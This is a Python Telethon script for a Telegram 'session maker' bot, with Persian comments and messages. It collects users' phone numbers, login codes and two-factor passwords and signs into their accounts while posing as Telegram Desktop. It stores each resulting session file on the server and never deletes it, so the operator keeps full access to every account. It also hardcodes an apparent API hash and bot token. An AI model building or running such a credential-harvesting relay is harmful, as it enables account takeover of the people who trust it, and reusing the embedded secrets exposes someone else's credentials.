import os
import sys
import asyncio
import re
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

# ==================== تنظیمات اولیه ====================
API_ID = 34855392
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"
BOT_TOKEN = "8692323102:AAHVQ5sxZjQk81D8YN5QNItQXMt25vurXqQ"

if not API_ID or not API_HASH or not BOT_TOKEN:
    print("❌ ERROR: Missing required values!")
    sys.exit(1)

print(f"✅ API_ID: {API_ID}")
print(f"✅ API_HASH: {API_HASH[:10]}...")
print(f"✅ BOT_TOKEN: {BOT_TOKEN[:10]}...")

# دیکشنری برای ذخیره وضعیت کاربران
user_sessions = {}

# ==================== بخش HTTP Server ====================
try:
    from aiohttp import web
    
    async def health_check(request):
        return web.Response(text="✅ Bot is running!", status=200)
    
    async def run_web_server():
        port = int(os.environ.get("PORT", 8080))
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        print(f"🌐 Web server running on port {port}")
        while True:
            await asyncio.sleep(3600)
    
except ImportError:
    print("⚠️ aiohttp not installed. Web server disabled.")
    async def run_web_server():
        port = int(os.environ.get("PORT", 8080))
        print(f"⚠️ Web server not available, but port {port} is configured.")
        while True:
            await asyncio.sleep(3600)

# ==================== کلاس اصلی ربات ====================
class SessionBot:
    def __init__(self):
        self.bot = TelegramClient(
            'session_bot',
            API_ID,
            API_HASH,
            device_model="Windows 11",
            system_version="Windows 11",
            app_version="Telegram Desktop",
            lang_code="en",
            system_lang_code="en-US"
        )
        self.temp_clients = {}

    def clean_code(self, raw_code):
        """
        پاکسازی کد ورودی:
        - حذف فاصله‌ها
        - حذف نقطه‌ها
        - فقط نگه داشتن اعداد
        """
        # حذف فاصله‌ها و نقطه‌ها
        cleaned = raw_code.replace(" ", "").replace(".", "")
        # فقط اعداد را نگه دار
        cleaned = re.sub(r'[^0-9]', '', cleaned)
        return cleaned

    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("🤖 ربات راه‌اندازی شد!")
        me = await self.bot.get_me()
        print(f"✅ ربات با نام @{me.username} آماده است!")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_command(event):
            user_id = event.sender_id
            session_name = f"user_{user_id}"
            session_path = os.path.expanduser(f"~/sessions/{session_name}")
            
            client = TelegramClient(
                session_path,
                API_ID,
                API_HASH,
                device_model="Windows 11",
                system_version="Windows 11",
                app_version="Telegram Desktop",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            self.temp_clients[user_id] = {
                'client': client,
                'session_path': session_path,
                'session_name': session_name,
                'step': 'phone',
                'code': '',
                'phone': None,
                'code_length': 5,
                'message_id': None,
                'phone_code_hash': None,
                'waiting_for_code': False  # برای تشخیص اینکه کاربر در مرحله دریافت کد است
            }
            
            await event.respond(
                "👋 به ربات ساخت سشن خوش آمدید!\n\n"
                "📱 لطفاً شماره تلفن خود را با کد کشور وارد کنید.\n"
                "مثال: +989123456789\n\n"
                "⚠️ فرمت‌های مجاز برای کد:\n"
                "• `0 0 0 0 0`\n"
                "• `0.0.0.0.0`\n"
                "• `00000`"
            )

        @self.bot.on(events.NewMessage)
        async def handle_messages(event):
            if event.is_private and event.text and not event.text.startswith('/'):
                user_id = event.sender_id
                
                if user_id not in self.temp_clients:
                    await event.respond("❗ لطفاً ابتدا /start را بزنید.")
                    return
                
                user_data = self.temp_clients[user_id]
                step = user_data['step']
                client = user_data['client']
                
                try:
                    if step == 'phone':
                        phone = event.text.strip()
                        
                        await client.connect()
                        
                        if not await client.is_user_authorized():
                            try:
                                send_result = await client.send_code_request(phone)
                                user_data['phone'] = phone
                                user_data['step'] = 'code'
                                user_data['code'] = ''
                                user_data['phone_code_hash'] = send_result.phone_code_hash
                                user_data['waiting_for_code'] = True
                                
                                # نمایش پنل کد
                                await self.show_code_panel(event, user_data)
                                
                            except Exception as e:
                                await event.respond(f"❌ خطا: {str(e)}")
                        else:
                            await event.respond("⚠️ این شماره قبلاً تأیید شده است!")
                    
                    elif step == 'code' or step == '2fa':
                        # اگر کاربر کد را به صورت پیام متنی ارسال کرده
                        if user_data.get('waiting_for_code', False):
                            raw_code = event.text.strip()
                            
                            # پاکسازی کد
                            cleaned_code = self.clean_code(raw_code)
                            
                            # بررسی اینکه کد پاکسازی شده فقط شامل اعداد باشد
                            if cleaned_code and cleaned_code.isdigit():
                                # به‌روزرسانی کد در user_data
                                user_data['code'] = cleaned_code
                                
                                # اگر کد کامل است، آن را تأیید کن
                                code_length = user_data.get('code_length', 5)
                                if len(cleaned_code) == code_length:
                                    # کد را مستقیماً تأیید کن
                                    if step == '2fa':
                                        await self.verify_2fa(event, user_data)
                                    else:
                                        await self.verify_code(event, user_data)
                                else:
                                    # کد کامل نیست، پیام خطا بده
                                    await event.respond(
                                        f"⚠️ کد باید {code_length} رقم باشد.\n"
                                        f"کد وارد شده: `{cleaned_code}` ({len(cleaned_code)} رقم)\n\n"
                                        "لطفاً دوباره تلاش کنید:\n"
                                        "• `0 0 0 0 0`\n"
                                        "• `0.0.0.0.0`\n"
                                        "• `00000`"
                                    )
                            else:
                                # کد نامعتبر
                                await event.respond(
                                    "⚠️ فرمت کد نامعتبر است!\n\n"
                                    "فرمت‌های مجاز:\n"
                                    "• `0 0 0 0 0`\n"
                                    "• `0.0.0.0.0`\n"
                                    "• `00000`\n\n"
                                    "لطفاً دوباره تلاش کنید."
                                )
                        else:
                            # کاربر در مرحله کد نیست اما پیام داده
                            await event.respond(
                                "⚠️ لطفاً از دکمه‌های زیر استفاده کنید یا کد را با فرمت صحیح ارسال کنید.\n\n"
                                "فرمت‌های مجاز:\n"
                                "• `0 0 0 0 0`\n"
                                "• `0.0.0.0.0`\n"
                                "• `00000`"
                            )
                
                except Exception as e:
                    await event.respond(f"❌ خطای غیرمنتظره: {str(e)}")

        @self.bot.on(events.CallbackQuery)
        async def handle_callback(event):
            user_id = event.sender_id
            
            if user_id not in self.temp_clients:
                await event.answer("❗ لطفاً ابتدا /start را بزنید.", alert=True)
                return
            
            user_data = self.temp_clients[user_id]
            data = event.data.decode()
            
            if user_data['step'] == 'code' or user_data['step'] == '2fa':
                await self.handle_code_input(event, user_data, data)

        await self.bot.run_until_disconnected()

    async def show_code_panel(self, event, user_data):
        """نمایش پنل شیشه‌ای وارد کردن کد"""
        step = user_data['step']
        code = user_data['code']
        
        if step == '2fa':
            title = "🔐 رمز عبور دو مرحله‌ای را وارد کنید:"
            placeholder = "••••••••"
            display_code = "•" * len(code) if code else placeholder
        else:
            code_length = user_data.get('code_length', 5)
            title = "📝 کد تأیید را وارد کنید:"
            placeholder = "_" * code_length
            
            if code:
                display_code = code + "_" * (code_length - len(code))
            else:
                display_code = placeholder
        
        # ساخت دکمه‌ها
        buttons = []
        row = []
        for i in range(1, 10):
            row.append((str(i), f"code_{i}"))
            if i % 3 == 0:
                buttons.append(row)
                row = []
        
        buttons.append([
            ("🗑️ پاک کردن", "code_clear"),
            ("0", "code_0"),
            ("✅ تأیید", "code_submit")
        ])
        
        keyboard = []
        for row in buttons:
            keyboard.append([{
                'text': text,
                'callback_data': callback_data
            } for text, callback_data in row])
        
        # اضافه کردن راهنمای ارسال مستقیم
        message_text = (
            f"{title}\n\n"
            f"`{display_code}`\n\n"
            "📱 **یا می‌توانید کد را مستقیماً ارسال کنید:**\n"
            "• `0 0 0 0 0`\n"
            "• `0.0.0.0.0`\n"
            "• `00000`\n\n"
            "از دکمه‌های زیر یا پیام متنی استفاده کنید:"
        )
        
        if user_data.get('message_id'):
            try:
                await self.bot.edit_message(
                    event.chat_id,
                    user_data['message_id'],
                    message_text,
                    parse_mode='markdown',
                    buttons=keyboard
                )
            except:
                msg = await event.respond(message_text, parse_mode='markdown', buttons=keyboard)
                user_data['message_id'] = msg.id
        else:
            msg = await event.respond(message_text, parse_mode='markdown', buttons=keyboard)
            user_data['message_id'] = msg.id
        
        await event.answer()

    async def handle_code_input(self, event, user_data, data):
        """پردازش ورودی‌های پنل کد"""
        code = user_data['code']
        step = user_data['step']
        
        if data.startswith('code_'):
            action = data.split('_')[1]
            
            if action == 'clear':
                if code:
                    user_data['code'] = code[:-1]
                await self.show_code_panel(event, user_data)
                await event.answer()
                
            elif action == 'submit':
                if step == '2fa':
                    if len(code) < 1:
                        await event.answer("❗ لطفاً رمز عبور را وارد کنید.", alert=True)
                        return
                    await self.verify_2fa(event, user_data)
                else:
                    code_length = user_data.get('code_length', 5)
                    if len(code) != code_length:
                        await event.answer(f"❗ لطفاً کد {code_length} رقمی را کامل وارد کنید.", alert=True)
                        return
                    await self.verify_code(event, user_data)
                
            elif action.isdigit():
                if step == '2fa':
                    user_data['code'] = code + action
                else:
                    code_length = user_data.get('code_length', 5)
                    if len(code) < code_length:
                        user_data['code'] = code + action
                    else:
                        await event.answer(f"❗ کد {code_length} رقمی کامل شد.", alert=True)
                        return
                await self.show_code_panel(event, user_data)
                await event.answer()

    async def verify_code(self, event, user_data):
        """تأیید کد ورود با استفاده از روش صحیح Telethon"""
        code = user_data['code']
        phone = user_data['phone']
        client = user_data['client']
        phone_code_hash = user_data.get('phone_code_hash')
        
        try:
            # روش صحیح تأیید کد در Telethon
            if phone_code_hash:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            else:
                await client.sign_in(phone, code)
            
            # موفقیت
            await event.answer("✅ تأیید کد با موفقیت انجام شد!", alert=True)
            
            # ارسال فایل سشن
            session_file = user_data['session_path'] + ".session"
            
            if os.path.isfile(session_file):
                # ارسال به Saved Messages
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                # ارسال به ربات
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                # حذف پنل
                if user_data.get('message_id'):
                    try:
                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
                    except:
                        pass
                
                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                
                # پاک کردن داده‌های موقت
                del self.temp_clients[event.sender_id]
            else:
                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                
        except SessionPasswordNeededError:
            # نیاز به رمز 2FA
            user_data['step'] = '2fa'
            user_data['code'] = ''
            user_data['waiting_for_code'] = True
            await event.answer("🔐 نیاز به رمز عبور دو مرحله‌ای!", alert=True)
            await self.show_code_panel(event, user_data)
            
        except PhoneCodeInvalidError:
            # کد اشتباه
            user_data['code'] = ''
            await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
            await self.show_code_panel(event, user_data)
            
        except PhoneCodeExpiredError:
            # کد منقضی شده
            await event.answer("❌ کد منقضی شده است. دوباره /start را بزنید.", alert=True)
            del self.temp_clients[event.sender_id]
            
        except Exception as e:
            error_msg = str(e)
            # بررسی خطاهای خاص
            if "FLOOD" in error_msg:
                await event.answer("❌ تعداد درخواست‌ها زیاد است. چند دقیقه صبر کنید.", alert=True)
            elif "PHONE_CODE_INVALID" in error_msg:
                user_data['code'] = ''
                await event.answer("❌ کد وارد شده اشتباه است! دوباره تلاش کنید.", alert=True)
                await self.show_code_panel(event, user_data)
            else:
                await event.answer(f"❌ خطا: {error_msg}", alert=True)

    async def verify_2fa(self, event, user_data):
        """تأیید رمز 2FA با استفاده از روش صحیح Telethon"""
        password = user_data['code']
        client = user_data['client']
        
        try:
            await client.sign_in(password=password)
            
            # موفقیت
            await event.answer("✅ تأیید رمز با موفقیت انجام شد!", alert=True)
            
            # ارسال فایل سشن
            session_file = user_data['session_path'] + ".session"
            
            if os.path.isfile(session_file):
                # ارسال به Saved Messages
                await client.send_file(
                    "me",
                    session_file,
                    caption=f"📁 فایل سشن: {user_data['session_name']}"
                )
                
                # ارسال به ربات
                await self.bot.send_file(
                    event.chat_id,
                    session_file,
                    caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                )
                
                # حذف پنل
                if user_data.get('message_id'):
                    try:
                        await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
                    except:
                        pass
                
                await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                
                # پاک کردن داده‌های موقت
                del self.temp_clients[event.sender_id]
            else:
                await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                
        except Exception as e:
            error_msg = str(e)
            if "PASSWORD_HASH_INVALID" in error_msg or "SRP_ID_INVALID" in error_msg:
                user_data['code'] = ''
                await event.answer("❌ رمز عبور اشتباه است! دوباره تلاش کنید.", alert=True)
                await self.show_code_panel(event, user_data)
            else:
                await event.answer(f"❌ خطا: {error_msg}", alert=True)

# ==================== اجرای اصلی ====================
async def main():
    os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
    bot = SessionBot()
    
    try:
        bot_task = asyncio.create_task(bot.start())
        web_task = asyncio.create_task(run_web_server())
        
        done, pending = await asyncio.wait(
            [bot_task, web_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        
        for task in pending:
            task.cancel()
            
    except KeyboardInterrupt:
        print("\n🛑 ربات متوقف شد.")
    except Exception as e:
        print(f"❌ خطا: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 برنامه با Ctrl+C متوقف شد.")
    except Exception as e:
        print(f"❌ خطای اجرا: {e}")
        sys.exit(1)
